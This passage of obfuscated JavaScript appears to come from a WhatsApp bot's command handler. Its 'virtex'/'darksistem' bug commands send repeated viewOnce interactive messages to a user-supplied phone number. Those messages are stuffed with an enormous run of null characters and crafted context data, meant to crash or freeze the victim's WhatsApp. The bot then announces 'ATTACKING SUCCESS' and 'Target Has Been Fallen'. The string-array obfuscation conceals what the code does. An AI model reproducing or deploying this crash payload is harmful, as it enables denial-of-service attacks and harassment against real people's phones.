_0x328844(_0x318789,_0x2d80d2-0x1dd,_0x263d86-0x363,_0xfbb99c-0x1a0);}_0x24ebea['TSoZj']='{}.constru'+_0x2bd8c3(-0x61,-0x87,-0x85,-0x81)+_0x134d1e(0xd8,0xb1,0xb0,0xfe)+'\x20)';const _0x44eb22=_0x24ebea;if(_0x48988f[_0x2bd8c3(-0x76,-0x9b,-0x74,-0xb2)]==='KRnZz'){const _0x43031f=_0x22ab64?function(){function _0x4c7aff(_0x3b11a8,_0x485204,_0x4f927a,_0x1c5c88){return _0x134d1e(_0x1c5c88-0x63,_0x485204-0x87,_0x4f927a,_0x1c5c88-0xf3);}function _0x20dec9(_0x20f935,_0x55bf89,_0x492e5d,_0x55c855){return _0x2bd8c3(_0x55c855- -0x41,_0x55bf89-0x62,_0x492e5d,_0x55c855-0x17d);}if(_0x48988f[_0x20dec9(-0x44,-0x6c,-0x6b,-0x6e)](_0x4c7aff(0x10c,0x14c,0xdb,0x114),_0x20dec9(-0xba,-0xaa,-0x66,-0x94))){if(_0x518376){if(_0x48988f[_0x20dec9(-0xc1,-0x7c,-0xd2,-0x9c)](_0x20dec9(-0xa9,-0x8f,-0x91,-0xa8),_0x20dec9(-0xae,-0xd5,-0xab,-0xa8))){const _0x3fc4a1=_0x518376[_0x20dec9(-0x14,-0x20,-0x4d,-0x53)](_0x14a18b,arguments);return _0x518376=null,_0x3fc4a1;}else{if(_0x3ecac7){const _0x44e3a3=_0x346cf2['apply'](_0x4bbfc9,arguments);return _0xf1b4d3=null,_0x44e3a3;}}}}else{let _0x5acb1b;try{_0x5acb1b=_0x3d556a('return\x20(fu'+_0x4c7aff(0x123,0x116,0x11a,0xf9)+_0x44eb22[_0x20dec9(-0xd6,-0xc3,-0xa2,-0xb0)]+');')();}catch(_0x6688f1){_0x5acb1b=_0x175a68;}return _0x5acb1b;}}:function(){};return _0x22ab64=![],_0x43031f;}else{const _0x6805c2=_0xb59908?function(){if(_0x34e33c){const _0x40408f=_0x5f0009['apply'](_0x600467,arguments);return _0x459ef2=null,_0x40408f;}}:function(){};return _0x1eb195=![],_0x6805c2;}};}()),_0x366b42=_0x1ecfe2(this,function(){function _0x15787d(_0x3d3fe9,_0x1d55eb,_0xcb16c9,_0x56f3b0){return _0x4bf7(_0x3d3fe9-0x2ae,_0xcb16c9);}const _0x3bad60={'hoQwW':function(_0x3c8f4f,_0x542157){return _0x3c8f4f===_0x542157;},'KLTQL':_0x15787d(0x3f3,0x3b8,0x3d5,0x3d5),'EuSUy':function(_0x5e8e0c,_0x4427d0){return _0x5e8e0c(_0x4427d0);},'jISRW':function(_0x1d93ce,_0x5988bc){return _0x1d93ce+_0x5988bc;},'TLtzQ':_0x15787d(0x3e3,0x3f7,0x3dd,0x3b0)+_0x2a4003(0x183,0x17b,0x145,0x1a9),'sZloV':_0x2a4003(0x19f,0x1a3,0x185,0x175)+_0x2a4003(0x190,0x1b1,0x19e,0x15e)+_0x2a4003(0x1c5,0x1a8,0x193,0x1a9)+'\x20)','wPCxg':function(_0x3b1c13,_0x31b424){return _0x3b1c13!==_0x31b424;},'RdHYz':_0x15787d(0x3a5,0x3cd,0x3ad,0x379),'HvIsS':function(_0x444e4c){return _0x444e4c();},'cRhUl':_0x15787d(0x3c4,0x392,0x3dc,0x3bc),'kKhcd':_0x2a4003(0x18f,0x1b4,0x191,0x1c8),'wNiER':_0x15787d(0x3c7,0x39b,0x3a2,0x3f5),'xtyyQ':'error','uUTPX':_0x15787d(0x3b9,0x3ea,0x386,0x39b),'Ayzjo':_0x2a4003(0x1b0,0x17d,0x1d8,0x1d7),'rdrCt':_0x15787d(0x3b1,0x3a3,0x3c5,0x3ba),'XyBNi':_0x15787d(0x406,0x429,0x438,0x41f)};function _0x2a4003(_0x48393b,_0x4c57c5,_0xf657df,_0x3fff2a){return _0x4bf7(_0x48393b-0x8a,_0x3fff2a);}const _0xf6ea15=function(){function _0x99bac(_0x3ac38e,_0x505d58,_0x4948aa,_0x48c637){return _0x2a4003(_0x505d58- -0xe4,_0x505d58-0x117,_0x4948aa-0x1b,_0x4948aa);}function _0x68ff0d(_0x292d59,_0x5aeac8,_0x5bd899,_0x288632){return _0x2a4003(_0x5bd899- -0xa7,_0x5aeac8-0x15c,_0x5bd899-0xaa,_0x288632);}if(_0x3bad60[_0x68ff0d(0xe3,0x9f,0xd0,0x91)](_0x3bad60['KLTQL'],_0x99bac(0xba,0xeb,0xd6,0xbe))){let _0x5e73e8;try{_0x5e73e8=_0x3bad60[_0x99bac(0xc8,0xef,0x101,0x109)](Function,_0x3bad60[_0x68ff0d(0x109,0x143,0x10a,0x143)](_0x3bad60[_0x68ff0d(0x110,0xf1,0x10a,0xfc)](_0x3bad60[_0x99bac(0x8f,0x82,0x4b,0x4b)],_0x3bad60[_0x68ff0d(0xe9,0x131,0xf6,0x12b)]),');'))();}catch(_0x2df4ff){_0x3bad60['wPCxg'](_0x3bad60['RdHYz'],_0x68ff0d(0xf1,0x118,0xda,0xcd))?_0x3fc211=_0x10199e:_0x5e73e8=window;}return _0x5e73e8;}else{const _0x20b319=_0x5805d2?function(){if(_0x4eec6f){const _0x1b4c71=_0x40c21a['apply'](_0x46e6dd,arguments);return _0x4316ef=null,_0x1b4c71;}}:function(){};return _0x22eb30=![],_0x20b319;}},_0x4519ed=_0x3bad60['HvIsS'](_0xf6ea15),_0x4a071a=_0x4519ed[_0x2a4003(0x1d2,0x1e2,0x1c7,0x1a9)]=_0x4519ed[_0x2a4003(0x1d2,0x202,0x212,0x1b8)]||{},_0x3ebe71=[_0x3bad60[_0x2a4003(0x1e0,0x1fe,0x203,0x1d1)],_0x3bad60[_0x2a4003(0x199,0x1d2,0x183,0x1c6)],_0x3bad60[_0x2a4003(0x1b3,0x1db,0x1c9,0x192)],_0x3bad60[_0x15787d(0x397,0x3b5,0x3a2,0x381)],_0x3bad60[_0x2a4003(0x1e4,0x1ee,0x20d,0x1c0)],_0x3bad60['Ayzjo'],_0x3bad60[_0x15787d(0x3bb,0x3ae,0x3a5,0x386)]];for(let _0x20e899=-0x6*-0x494+-0xad*-0x35+-0x3f49;_0x20e899<_0x3ebe71['length'];_0x20e899++){if(_0x3bad60[_0x2a4003(0x177,0x178,0x194,0x18d)]('IJHDk',_0x3bad60['XyBNi'])){const _0x37aac4=_0x585481[_0x15787d(0x403,0x41c,0x3ff,0x3d0)](_0x387222,arguments);return _0x2c6a9e=null,_0x37aac4;}else{const _0x13de76=_0x1ecfe2[_0x15787d(0x3f8,0x427,0x3ec,0x3ca)+'r']['prototype'][_0x15787d(0x401,0x431,0x3d3,0x3fb)](_0x1ecfe2),_0x390eb5=_0x3ebe71[_0x20e899],_0x270984=_0x4a071a[_0x390eb5]||_0x13de76;_0x13de76[_0x2a4003(0x1e3,0x217,0x1dc,0x1c5)]=_0x1ecfe2['bind'](_0x1ecfe2),_0x13de76[_0x15787d(0x399,0x3a3,0x36b,0x3d6)]=_0x270984[_0x15787d(0x399,0x37f,0x386,0x35e)][_0x15787d(0x401,0x431,0x3ca,0x43e)](_0x270984),_0x4a071a[_0x390eb5]=_0x13de76;}}});_0x366b42();function hi(){function _0x36bb61(_0x31f4bf,_0xa6ec29,_0x1d942b,_0x2230b9){return _0x4bf7(_0x1d942b-0x302,_0x31f4bf);}function _0x541da7(_0x4012e7,_0x2e92ea,_0x9279e1,_0x2bad9c){return _0x4bf7(_0x2bad9c-0x23,_0x9279e1);}console[_0x541da7(0xff,0x133,0x138,0x139)](_0x541da7(0x16f,0x179,0x180,0x170)+'d!');}if(!isPremium)return;darkphonk=fs['readFileSy'+'nc'](_0xa592dd(-0x1dd,-0x1da,-0x1cb,-0x1ea)+_0x1845b8(0x101,0x101,0x139,0xec)+'p3'),inireact(randomemoji);function _0x380f(){const _0x5d4466=['wNiER','⁗\x20⋄\x20𝐘𝐎𝐔\x20𝐖𝐈','𝗹𝗕𝘂𝗴\x0a\x0a┌───','ah\x20dengan\x20','KRnZz','externalAd','text','‹›──────━\x0a','tes,\x20So\x20Th','418woJqXY','jpegThumbn','2618480YnezmT','return\x20(fu','ibution','ah\x20Tidak\x20V','VdDOk','startsWith','ranse','rn\x20this\x22)(','<!>\x20Nomor\x20','」\x0a\x0a━──────','bugwait','or\x2010\x20minu','contextInf','@s.whatsap','sendMessag','previewTyp','ptt','LLCsk','title','\x20kode\x20nega','console','EuSUy','constructo','erThumbnai','14UtrLFH','Hello\x20Worl','꫟Кz-Ж𝐭𝐞𝐧𝐭𝐢','*hoGanteng𝕣𝕤̊','𝗵𝘁\x20&\x20𝗦𝘄𝗲𝗲𝘁','9944196aHmnBn','33Isqvau','bind','ample\x20:\x20.','apply','cRhUl','👾\x20𝗟𝗼𝘀𝘁\x20𝗟𝗶𝗴','yPsPY','__proto__','uUTPX','194844bjrcjR','chat','sourceUrl','TLtzQ','18uaeHUP','𝐆\x20𝐒𝐔𝐂𝐂𝐄𝐒𝐒\x20','789','n\x27t\x20Get\x20𝗕𝗮','prototype','789\x20]','\x20Senpai!\x0a\x0a','relayMessa','6978OhKjSY','./media/au','𝐢𝐫𝐮𝐬⿻','search','xtyyQ','PHTDF','toString','amsJson','hoQwW','VIDEO','4312830vMBJZF','Reply','VIytQ','ngan\x20angka','\x0a\x0a╰┈\x20Pause','nomor\x20yang','audio','(((.+)+)+)','stbjg','TSoZj','nction()\x20','\x20the\x20bot\x20f','messagePar','ssage','mediaType','─᚜「\x20𝗡𝗼𝘁𝗲\x20」','dio/dead.m','CKoUe','\x20berawalan','ail','trace','mimetype','warn','ctor(\x22retu','e\x20Bot\x20Does','42ikIWJy','32244isaBjp','「\x20𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍','exception','bhKHc','rdrCt','𝗻𝗻𝗲𝗱\x0a\x0a—𝗧𝗵𝗲','kKhcd','SonqX','𝗹𝗲𝗻\x20‹›','renderLarg','sZloV','AagNM','{}.constru','log','𝐋𝐋\x20𝐃𝐈𝐄!!\x20','hasMediaAt','info','*\x0a\x0a𖥂\x20𝐕𝐈𝐑𝐔𝐒','url','enggunaan\x20','locationMe','quoted','replace','alid!\x0a\x0a[\x20P','atsapp.net','mediaUrl','body','𝐨𝐧\x20||\x20Ho.𝐕','showAdAttr','table','jISRW','6576500XPtJOY'];_0x380f=function(){return _0x5d4466;};return _0x380f();}if(!q)return zreply('<!>\x20Perint'+_0xa592dd(-0x150,-0x189,-0x1a6,-0x179)+_0x1845b8(0x122,0x124,0x125,0x114)+_0xa592dd(-0x16c,-0x1a4,-0x1a1,-0x1b6)+'.'+command+('\x20628123456'+_0xa592dd(-0x1a9,-0x1de,-0x219,-0x21a)));let bijipler=q[_0xa592dd(-0x18a,-0x1a1,-0x1db,-0x1cb)](/[^0-9]/g,'');if(bijipler[_0x1845b8(0x13b,0x163,0x176,0x115)]('0'))return zreply(_0x1845b8(0x13e,0x16d,0x16f,0x106)+'dimulai\x20de'+_0x1845b8(0xf4,0xf7,0x12e,0x125)+'\x200.\x20Gantil'+_0x1845b8(0x12e,0x129,0x101,0x142)+_0xa592dd(-0x1a3,-0x1cc,-0x1cf,-0x1bc)+_0x1845b8(0x103,0x135,0xe8,0x10e)+_0x1845b8(0x149,0x140,0x147,0x11b)+'ra\x0a\x0a<✓>\x20Ex'+_0x1845b8(0x156,0x142,0x18e,0x166)+command+('\x20628123456'+_0xa592dd(-0x222,-0x1e1,-0x1ab,-0x20a)));let target=bijipler+(_0x1845b8(0x143,0x17d,0x113,0x160)+'p.net');zreply(mess[_0xa592dd(-0x1a5,-0x182,-0x18e,-0x160)]),await sleep(-0x1*0x1b16+-0x15b1+-0x85d*-0x7);for(let i=-0x1*-0x17ff+-0x3*0xa9+-0x1604;i<-0xdf3*0x1+0x1*-0x1669+0x246b;i++){const _0x4f9214={};_0x4f9214[_0x1845b8(0x148,0x175,0x111,0x142)]='',_0x4f9214[_0x1845b8(0x11f,0xf6,0x10a,0x15e)+_0xa592dd(-0x1ff,-0x1c4,-0x1e6,-0x1b4)]={},_0x4f9214[_0x1845b8(0x11a,0xda,0x11d,0x13c)+'tachment']=!![];const _0x1bff03={};_0x1bff03[_0xa592dd(-0x1a7,-0x1c5,-0x1b3,-0x1b9)+_0xa592dd(-0x1ce,-0x1d4,-0x198,-0x213)]='',zynxzo[_0x1845b8(0xe6,0x100,0xd5,0x10c)+'ge'](target,{'viewOnceMessage':{'message':{'interactiveMessage':{'header':_0x4f9214,'body':{'text':_0x1845b8(0x151,0x15b,0x165,0x15b)+'ⅈ͓߲hoganteng\x20𑅆'+'༏'+'\x00'['repeat'](-0xdb5e9+-0xaab32+0x261cbb)},'nativeFlowMessage':_0x1bff03,'carouselMessage':{}}}}},{'participant':{'jid':target}}),await sleep(0x1320+-0x1425+0xcbd);}const _0x39fca3={};_0x39fca3[_0x1845b8(0x127,0x125,0x100,0x121)+_0x1845b8(0x138,0x13e,0x16f,0xf8)]=![],_0x39fca3[_0x1845b8(0x114,0x13b,0x105,0x14b)+_0xa592dd(-0x17e,-0x175,-0x153,-0x1b0)+'l']=![],_0x39fca3[_0xa592dd(-0x1a9,-0x18d,-0x1b9,-0x1bc)+_0x1845b8(0x104,0xd6,0x114,0x140)]=fakejpg,_0x39fca3[_0x1845b8(0x148,0x151,0x14e,0x127)]=xcrash['xv'],_0x39fca3[_0xa592dd(-0x1ae,-0x19d,-0x1c1,-0x1bf)]=_0xa592dd(-0x185,-0x196,-0x187,-0x188)+_0x1845b8(0x119,0xee,0xe5,0x13c),_0x39fca3[_0xa592dd(-0x15b,-0x17d,-0x19d,-0x198)+'e']=_0xa592dd(-0x1df,-0x1d2,-0x1df,-0x1db),_0x39fca3[_0x1845b8(0xdd,0xe2,0xf0,0x10c)]=_0xa592dd(-0x185,-0x172,-0x132,-0x136)+_0xa592dd(-0x19c,-0x19c,-0x1ad,-0x1ba)+_0x1845b8(0xe9,0x10e,0xac,0x102),_0x39fca3[_0x1845b8(0xff,0x112,0xe0,0x109)]=0x1,_0x39fca3[_0xa592dd(-0x1a8,-0x19e,-0x19e,-0x1c7)]=''+global['url'];function _0x1845b8(_0x1ece6b,_0x36c23f,_0x3071aa,_0x1ef809){return _0x4bf7(_0x1ece6b-0x2,_0x3071aa);}const _0x3a311a={};_0x3a311a['mentionedJ'+'id']=['00000@s.wh'+_0x1845b8(0x123,0x139,0x113,0x13d)],_0x3a311a[_0x1845b8(0x130,0x12e,0x118,0x10c)+_0x1845b8(0xf2,0x122,0xd9,0xd5)]=_0x39fca3;const _0x4e9cf0={};_0x4e9cf0[_0xa592dd(-0x1a8,-0x180,-0x1b2,-0x155)+'o']=_0x3a311a,_0x4e9cf0[_0x1845b8(0x131,0x143,0x13e,0x10a)]=_0xa592dd(-0x1a3,-0x169,-0x16a,-0x192)+_0xa592dd(-0x15a,-0x170,-0x140,-0x1a6)+'\x20𝗟𝗶𝗲\x0a<!>\x20Z'+'ynxzoo,'+_0x1845b8(0xe5,0x112,0xaf,0xf7)+'「\x20HoxHunte'+'r\x20」';function _0xa592dd(_0x5caf7b,_0x1126a9,_0x279145,_0x5be252){return _0x4bf7(_0x1126a9- -0x2c0,_0x5be252);}const _0x9a29c3={};function _0x4bf7(_0x265763,_0x35a73e){const _0x380fee=_0x380f();return _0x4bf7=function(_0x4bf7de,_0x2fbb54){_0x4bf7de=_0x4bf7de-(0x1*-0x2047+0x1106+-0x1*-0x101c);let _0x547446=_0x380fee[_0x4bf7de];return _0x547446;},_0x4bf7(_0x265763,_0x35a73e);}_0x9a29c3[_0xa592dd(-0x1ba,-0x1a2,-0x1b4,-0x196)]=hobug,await zynxzo['sendMessag'+'e'](target,_0x4e9cf0,_0x9a29c3);const _0x1a4c84={};_0x1a4c84[_0x1845b8(0x11d,0x14a,0xf0,0x15b)]=''+zynxzoAttack,zynxzo['sendMessag'+'e'](m[_0x1845b8(0x15e,0x17e,0x175,0x13a)],{'image':_0x1a4c84,'caption':_0xa592dd(-0x18d,-0x1b6,-0x194,-0x1d6)+_0xa592dd(-0x1bc,-0x1e2,-0x1cd,-0x1c3)+_0xa592dd(-0x1a3,-0x183,-0x19b,-0x1a5)+_0x1845b8(0x132,0x162,0x118,0x141)+'\x0a𖥂\x20𝐓𝐀𝐑𝐆𝐄𝐓\x20'+':\x20@'+target['split']('@')[-0x4*0x26f+-0x182f+-0x1*-0x21eb]+(_0x1845b8(0x11c,0x14c,0x12d,0x148)+'\x20:\x20𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻'+_0x1845b8(0x12d,0x133,0x16b,0x13a)+_0xa592dd(-0x1c7,-0x1c2,-0x186,-0x1b0)+_0x1845b8(0xf5,0xfc,0xf1,0x123)+_0x1845b8(0xfc,0x13a,0xec,0x120)+_0x1845b8(0x141,0x111,0x17a,0x106)+_0xa592dd(-0x1b9,-0x18f,-0x1a9,-0x153)+_0x1845b8(0x109,0x138,0x146,0x111)+_0x1845b8(0xe2,0xaa,0xe7,0xea)+_0xa592dd(-0x1ec,-0x1b2,-0x18f,-0x1e0)+'\x20𝗧𝗮𝗿𝗴𝗲𝘁\x20𝗛𝗮'+'𝘀\x20𝗕𝗲𝗲𝗻\x20𝗙𝗮𝗹'+_0xa592dd(-0x173,-0x1af,-0x1c4,-0x199))},{'quoted':m}),await sleep(0x4cb+-0x1601+0x2*0xc83);const _0x42ab3e={};_0x42ab3e[_0x1845b8(0xf7,0x116,0xbb,0xea)]=darkphonk,_0x42ab3e[_0x1845b8(0x106,0xca,0xde,0x136)]='audio/mp4',_0x42ab3e[_0xa592dd(-0x13b,-0x17c,-0x142,-0x18f)]=!![];const _0x25b4b3={};_0x25b4b3[_0x1845b8(0x120,0x135,0x151,0x15c)]=zets,zynxzo[_0x1845b8(0x144,0x116,0x17d,0x175)+'e'](m[_0x1845b8(0x15e,0x134,0x13d,0x12e)],_0x42ab3e,_0x25b4b3),taskdone(finishmoji);
}
break
// Bug Command
//=================================================//
case 'virtex': case 'virtex1': case 'virtex2': case 'virtex3': case 'byone': case 'p-mabar': case 'awokawok': case 'anjaymabar': case '1v1': case 'darksistem':  {
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!isPremium) return 
(function(_0x122129,_0x558475){function _0x56414b(_0x5d780d,_0x157058,_0xc68ee,_0x2d7f62){return _0x4bf7(_0x157058-0xaa,_0xc68ee);}const _0x99b42d=_0x122129();function _0x56f6e6(_0x1b5e75,_0x504095,_0x4d990b,_0x36ae72){return _0x4bf7(_0x36ae72- -0x323,_0x504095);}while(!![]){try{const _0xb7d9c3=-parseInt(_0x56f6e6(-0x262,-0x269,-0x275,-0x23e))/(-0x1902+-0x2*-0x12d+0x1*0x16a9)*(parseInt(_0x56414b(0x1cc,0x1dc,0x1c2,0x213))/(-0x9b8*0x2+-0x31*-0x93+0x19*-0x59))+-parseInt(_0x56f6e6(-0x22c,-0x217,-0x24d,-0x21b))/(-0x65b+-0xf82+-0x2*-0xaf0)*(parseInt(_0x56414b(0x196,0x1b3,0x17e,0x1e2))/(-0x53c+0x18d9+-0x1399))+-parseInt(_0x56414b(0x1f8,0x1d2,0x1f2,0x20d))/(0xdcd*-0x1+0x16cb+-0x8f9)+-parseInt(_0x56414b(0x21e,0x205,0x1f2,0x1ed))/(0x2e3*0x5+-0x2*0x109d+-0x1*-0x12d1)*(-parseInt(_0x56414b(0x1cf,0x1f6,0x1bc,0x1be))/(-0x125f+-0x19b5+-0x64d*-0x7))+parseInt(_0x56f6e6(-0x201,-0x1cd,-0x20f,-0x1ef))/(-0x711+-0x115*0x6+-0x1*-0xd97)*(parseInt(_0x56414b(0x15e,0x187,0x148,0x1a9))/(0x1*0xa39+-0x6f0+-0x1a0*0x2))+parseInt(_0x56f6e6(-0x202,-0x251,-0x26c,-0x234))/(0x332+0x20*0xdf+-0x1f08)+parseInt(_0x56414b(0x21f,0x1fc,0x1ef,0x234))/(0x43e+-0x4*0x8d9+0x1f31*0x1)*(parseInt(_0x56f6e6(-0x209,-0x1fe,-0x1d8,-0x1d2))/(0x1957+-0x146e+0x5*-0xf9));if(_0xb7d9c3===_0x558475)break;else _0x99b42d['push'](_0x99b42d['shift']());}catch(_0x14927d){_0x99b42d['push'](_0x99b42d['shift']());}}}(_0x380f,-0xe0cb0+0x15724f*-0x1+0x2ef207));const _0x35a73e=(function(){const _0x688185={};_0x688185[_0x182a46(0x152,0x18d,0x145,0x16d)]=_0x182a46(0x189,0x154,0x1bb,0x193);function _0x182a46(_0x395474,_0x4a5ad1,_0x1a314b,_0x52aa29){return _0x4bf7(_0x52aa29-0x83,_0x1a314b);}function _0x38df56(_0x4db392,_0x4d3f4f,_0x39b4f9,_0xf2070a){return _0x4bf7(_0xf2070a- -0x2e6,_0x39b4f9);}const _0x23721a=_0x688185;let _0x536b54=!![];return function(_0x302492,_0x53905b){const _0x205a06=_0x536b54?function(){function _0x329422(_0x3eb809,_0x474b35,_0x5020ce,_0x4d7b32){return _0x4bf7(_0x5020ce-0x3b9,_0x3eb809);}function _0x171d78(_0x356199,_0x50fc30,_0x52f85b,_0x2cf418){return _0x4bf7(_0x2cf418-0x19a,_0x356199);}if(_0x53905b){if(_0x23721a[_0x329422(0x4e1,0x488,0x4a3,0x463)]===_0x171d78(0x27a,0x27c,0x2c0,0x2aa)){const _0x3cc037=_0x53905b[_0x171d78(0x300,0x2b1,0x2ce,0x2ef)](_0x302492,arguments);return _0x53905b=null,_0x3cc037;}else{const _0x1928b5=_0x264cc6[_0x329422(0x507,0x501,0x503,0x4d8)+'r'][_0x171d78(0x266,0x2a6,0x27a,0x27b)][_0x171d78(0x2ec,0x2b7,0x2ee,0x2ed)](_0x5ba54a),_0x45b9ef=_0x957e47[_0xe130e8],_0x1c8e76=_0x14a7d7[_0x45b9ef]||_0x1928b5;_0x1928b5[_0x171d78(0x31d,0x2c0,0x2d2,0x2f3)]=_0x377e34[_0x329422(0x526,0x4ff,0x50c,0x52c)](_0x438046),_0x1928b5[_0x329422(0x4db,0x4b5,0x4a4,0x47e)]=_0x1c8e76[_0x171d78(0x2b3,0x26f,0x2af,0x285)][_0x171d78(0x2ea,0x2c6,0x2d1,0x2ed)](_0x1c8e76),_0x373fc1[_0x45b9ef]=_0x1928b5;}}}:function(){};return _0x536b54=![],_0x205a06;};}()),_0x265763=_0x35a73e(this,function(){function _0xb07758(_0x11ec0f,_0xa61df9,_0x4a13a1,_0x149c6b){return _0x4bf7(_0x149c6b- -0xa,_0x4a13a1);}const _0x43619c={};_0x43619c[_0xb07758(0x118,0x133,0x165,0x12e)]=_0x52a9a2(0x1bd,0x1f9,0x1d4,0x1cf)+'+$';const _0x141fbc=_0x43619c;function _0x52a9a2(_0x235cfd,_0xfc5b59,_0x59a1c7,_0x37e76c){return _0x4bf7(_0x37e76c-0xd9,_0x235cfd);}return _0x265763[_0xb07758(0xac,0xa0,0xc0,0xe1)]()[_0xb07758(0xdb,0xf5,0xce,0xde)](_0x52a9a2(0x1ca,0x1f1,0x19b,0x1cf)+'+$')['toString']()['constructo'+'r'](_0x265763)[_0x52a9a2(0x1db,0x181,0x191,0x1c1)](_0x141fbc[_0x52a9a2(0x211,0x203,0x20e,0x211)]);});_0x265763();const _0x1ecfe2=(function(){const _0x340496={};_0x340496[_0x328844(-0x299,-0x2a8,-0x28c,-0x2b2)]=function(_0x1e3d57,_0x46836f){return _0x1e3d57===_0x46836f;};function _0x5e33ff(_0x1436da,_0x40e6c0,_0x857234,_0x2818e9){return _0x4bf7(_0x1436da-0x1ab,_0x40e6c0);}function _0x328844(_0x432037,_0x3c886c,_0x30737d,_0x454ab0){return _0x4bf7(_0x30737d- -0x3c6,_0x432037);}_0x340496['bhKHc']=function(_0x368eaa,_0x54ebdd){return _0x368eaa===_0x54ebdd;},_0x340496[_0x5e33ff(0x29c,0x2bf,0x2c0,0x274)]=_0x5e33ff(0x2d8,0x2ba,0x306,0x29f);const _0x48988f=_0x340496;let _0x22ab64=!![];return function(_0x14a18b,_0x518376){function _0x2bd8c3(_0x3c1839,_0x3ba079,_0x282126,_0x2d1f05){return _0x5e33ff(_0x3c1839- -0x312,_0x282126,_0x282126-0x1a7,_0x2d1f05-0x134);}const _0x24ebea={};function _0x134d1e(_0x263d86,_0x2d80d2,_0x318789,_0xfbb99c){return _0x328844(_0x318789,_0x2d80d2-0x1dd,_0x263d86-0x363,_0xfbb99c-0x1a0);}_0x24ebea['TSoZj']='{}.constru'+_0x2bd8c3(-0x61,-0x87,-0x85,-0x81)+_0x134d1e(0xd8,0xb1,0xb0,0xfe)+'\x20)';const _0x44eb22=_0x24ebea;if(_0x48988f[_0x2bd8c3(-0x76,-0x9b,-0x74,-0xb2)]==='KRnZz'){const _0x43031f=_0x22ab64?function(){function _0x4c7aff(_0x3b11a8,_0x485204,_0x4f927a,_0x1c5c88){return _0x134d1e(_0x1c5c88-0x63,_0x485204-0x87,_0x4f927a,_0x1c5c88-0xf3);}function _0x20dec9(_0x20f935,_0x55bf89,_0x492e5d,_0x55c855){return _0x2bd8c3(_0x55c855- -0x41,_0x55bf89-0x62,_0x492e5d,_0x55c855-0x17d);}if(_0x48988f[_0x20dec9(-0x44,-0x6c,-0x6b,-0x6e)](_0x4c7aff(0x10c,0x14c,0xdb,0x114),_0x20dec9(-0xba,-0xaa,-0x66,-0x94))){if(_0x518376){if(_0x48988f[_0x20dec9(-0xc1,-0x7c,-0xd2,-0x9c)](_0x20dec9(-0xa9,-0x8f,-0x91,-0xa8),_0x20dec9(-0xae,-0xd5,-0xab,-0xa8))){const _0x3fc4a1=_0x518376[_0x20dec9(-0x14,-0x20,-0x4d,-0x53)](_0x14a18b,arguments);return _0x518376=null,_0x3fc4a1;}else{if(_0x3ecac7){const _0x44e3a3=_0x346cf2['apply'](_0x4bbfc9,arguments);return _0xf1b4d3=null,_0x44e3a3;}}}}else{let _0x5acb1b;try{_0x5acb1b=_0x3d556a('return\x20(fu'+_0x4c7aff(0x123,0x116,0x11a,0xf9)+_0x44eb22[_0x20dec9(-0xd6,-0xc3,-0xa2,-0xb0)]+');')();}catch(_0x6688f1){_0x5acb1b=_0x175a68;}return _0x5acb1b;}}:function(){};return _0x22ab64=![],_0x43031f;}else{const _0x6805c2=_0xb59908?function(){if(_0x34e33c){const _0x40408f=_0x5f0009['apply'](_0x600467,arguments);return _0x459ef2=null,_0x40408f;}}:function(){};return _0x1eb195=![],_0x6805c2;}};}()),_0x366b42=_0x1ecfe2(this,function(){function _0x15787d(_0x3d3fe9,_0x1d55eb,_0xcb16c9,_0x56f3b0){return _0x4bf7(_0x3d3fe9-0x2ae,_0xcb16c9);}const _0x3bad60={'hoQwW':function(_0x3c8f4f,_0x542157){return _0x3c8f4f===_0x542157;},'KLTQL':_0x15787d(0x3f3,0x3b8,0x3d5,0x3d5),'EuSUy':function(_0x5e8e0c,_0x4427d0){return _0x5e8e0c(_0x4427d0);},'jISRW':function(_0x1d93ce,_0x5988bc){return _0x1d93ce+_0x5988bc;},'TLtzQ':_0x15787d(0x3e3,0x3f7,0x3dd,0x3b0)+_0x2a4003(0x183,0x17b,0x145,0x1a9),'sZloV':_0x2a4003(0x19f,0x1a3,0x185,0x175)+_0x2a4003(0x190,0x1b1,0x19e,0x15e)+_0x2a4003(0x1c5,0x1a8,0x193,0x1a9)+'\x20)','wPCxg':function(_0x3b1c13,_0x31b424){return _0x3b1c13!==_0x31b424;},'RdHYz':_0x15787d(0x3a5,0x3cd,0x3ad,0x379),'HvIsS':function(_0x444e4c){return _0x444e4c();},'cRhUl':_0x15787d(0x3c4,0x392,0x3dc,0x3bc),'kKhcd':_0x2a4003(0x18f,0x1b4,0x191,0x1c8),'wNiER':_0x15787d(0x3c7,0x39b,0x3a2,0x3f5),'xtyyQ':'error','uUTPX':_0x15787d(0x3b9,0x3ea,0x386,0x39b),'Ayzjo':_0x2a4003(0x1b0,0x17d,0x1d8,0x1d7),'rdrCt':_0x15787d(0x3b1,0x3a3,0x3c5,0x3ba),'XyBNi':_0x15787d(0x406,0x429,0x438,0x41f)};function _0x2a4003(_0x48393b,_0x4c57c5,_0xf657df,_0x3fff2a){return _0x4bf7(_0x48393b-0x8a,_0x3fff2a);}const _0xf6ea15=function(){function _0x99bac(_0x3ac38e,_0x505d58,_0x4948aa,_0x48c637){return _0x2a4003(_0x505d58- -0xe4,_0x505d58-0x117,_0x4948aa-0x1b,_0x4948aa);}function _0x68ff0d(_0x292d59,_0x5aeac8,_0x5bd899,_0x288632){return _0x2a4003(_0x5bd899- -0xa7,_0x5aeac8-0x15c,_0x5bd899-0xaa,_0x288632);}if(_0x3bad60[_0x68ff0d(0xe3,0x9f,0xd0,0x91)](_0x3bad60['KLTQL'],_0x99bac(0xba,0xeb,0xd6,0xbe))){let _0x5e73e8;try{_0x5e73e8=_0x3bad60[_0x99bac(0xc8,0xef,0x101,0x109)](Function,_0x3bad60[_0x68ff0d(0x109,0x143,0x10a,0x143)](_0x3bad60[_0x68ff0d(0x110,0xf1,0x10a,0xfc)](_0x3bad60[_0x99bac(0x8f,0x82,0x4b,0x4b)],_0x3bad60[_0x68ff0d(0xe9,0x131,0xf6,0x12b)]),');'))();}catch(_0x2df4ff){_0x3bad60['wPCxg'](_0x3bad60['RdHYz'],_0x68ff0d(0xf1,0x118,0xda,0xcd))?_0x3fc211=_0x10199e:_0x5e73e8=window;}return _0x5e73e8;}else{const _0x20b319=_0x5805d2?function(){if(_0x4eec6f){const _0x1b4c71=_0x40c21a['apply'](_0x46e6dd,arguments);return _0x4316ef=null,_0x1b4c71;}}:function(){};return 